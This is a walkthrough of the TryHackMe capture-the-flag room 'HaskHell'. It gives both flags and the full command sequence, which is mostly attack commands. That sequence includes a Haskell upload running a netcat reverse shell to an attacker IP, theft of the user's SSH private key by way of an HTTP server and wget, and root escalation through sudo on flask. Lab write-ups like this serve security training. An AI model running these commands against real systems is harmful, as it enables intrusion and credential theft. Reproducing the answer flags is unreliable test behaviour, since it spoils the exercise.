# <div align="center">[HaskHell](https://tryhackme.com/r/room/haskhell)</div>
<div align="center">Teach your CS professor that his PhD isn't in security</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/22815413-4b47-4523-ab64-26ea043316c3" height="200"></img>
</div>

# Task 1. HaskHell

Show your professor that his PhD isn't in security.

## Get the flag in the user.txt file.
```
flag{academic_dishonesty}
```
```
sudo nmap -sSCV <IP>
http://<IP>:5001/submit

#!/usr/bin/env runhaskhell
module Main where
import System.Process
main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 4444 >/tmp/f"


nc -nlvp 4444
whoami
id
ls -la /home
cd /home/prof/.ssh/
ls -la
which python3
python3 -m http.server
wget http://<IP>:8000/id_rsa

chmod 600 id_rsa
ssh -i id_rsa prof@<IP>
cat /home/prof/user.txt
```
## Obtain the flag in root.txt
```
flag{im_purely_functional}
```
```
SHELL=/bin/bash script -q /dev/null
sudo -l
ls -l /usr/bin/flask
file /usr/bin/flask
cat /usr/bin/flask
python3 /usr/bin/flask


cat > shell.py << EOF
> #!/usr/bin/env python3
> import pty
> pty.spawn("/bin/bash")
> EOF

export FLASK_APP=shell.py
sudo /usr/bin/flask run
whoami
cat /root/root.txt
```
